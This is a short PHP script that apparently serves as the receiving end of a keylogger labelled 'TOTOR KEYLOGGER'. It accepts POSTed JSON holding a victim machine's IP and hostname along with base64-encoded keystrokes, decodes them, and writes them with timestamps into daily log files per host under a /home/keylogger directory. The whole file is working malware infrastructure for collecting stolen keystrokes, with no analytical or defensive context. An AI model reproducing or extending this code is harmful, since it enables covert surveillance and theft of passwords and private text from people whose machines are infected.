<?php
	/*
	ini_set('display_errors', '1');
	ini_set('display_startup_errors', '1');
	error_reporting(E_ALL);
	*/

	$json = json_decode(file_get_contents('php://input'), true);
	
	if (isset($json)) {
		
		$k = array_keys($json)[0];
		$computer_info = explode('@', $k);
				
		$ip = $computer_info[0];
		$host = $computer_info[1];
		
		$base64 = $json[$k];
		$decoded = base64_decode($base64);
	
		$timestamp = time();
		
		$his = date("H:i:s", $timestamp);
		$dmy = date("d-m-Y", $timestamp);
		
		$path_to_logs = "/home/keylogger/" . $host;
		$path_to_file = $path_to_logs . "/Logs-" . $dmy . ".txt";
		
		if (!is_dir($path_to_logs)) {
			$a = mkdir($path_to_logs);
			if ($a) {
				echo "success";
			} else {
				echo "failed";
			}
		}
		
		if (!file_exists($path_to_file)) {
			$f = fopen($path_to_file, "w");
			
			fwrite($f, "[TOTOR KEYLOGGER]\n\n Host : " . $host . "\n IP : " . $ip . "\n Date : " . $dmy . "\n\n----------------------------------------\n\n");
			
			fwrite($f, " < " . $his . " >  " . $decoded . "\n");
			
			fclose($f);
		} else {
			$f = fopen($path_to_file, "a");
			
			fwrite($f, " < " . $his . " >\t" . $decoded . "\n");
			
			fclose($f);
		}
		
	}
